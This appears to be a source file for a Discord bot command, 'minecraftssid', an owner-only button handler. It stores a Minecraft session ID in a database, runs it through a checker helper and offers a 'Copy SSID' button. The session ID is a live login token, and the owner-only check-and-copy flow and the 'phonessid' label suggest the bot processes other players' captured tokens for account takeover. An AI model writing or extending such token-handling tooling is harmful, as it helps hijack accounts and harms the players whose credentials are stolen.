const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require("discord.js");
const ssidcheckermsg = require('../../utils/minecraft/ssidcheckermsg');
const generate = require('../../utils/generate');

module.exports = {
  name: "minecraftssid",
  ownerOnly: true,
  callback: async (client, interaction) => {
    let ssid = interaction.customId.split("|")[1];
    let rId = generate(32);
    await client.queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [rId, `phonessid|${ssid}`]);

    await interaction.deferReply({ ephemeral: true });

    try {
      let response = await ssidcheckermsg(ssid);
      
      let button = new ButtonBuilder()
        .setCustomId(`action|${rId}`)
        .setLabel("Copy SSID")
        .setStyle(ButtonStyle.Primary);

      let row = new ActionRowBuilder().addComponents(button);

      let replyOptions = typeof response === "object" ? response : { content: response };
      replyOptions.components = [row];

      await interaction.editReply(replyOptions);
    } catch (error) {
      console.error(error);
      await interaction.editReply({ content: `Error checking SSID.`, ephemeral: true });
    }
  }
};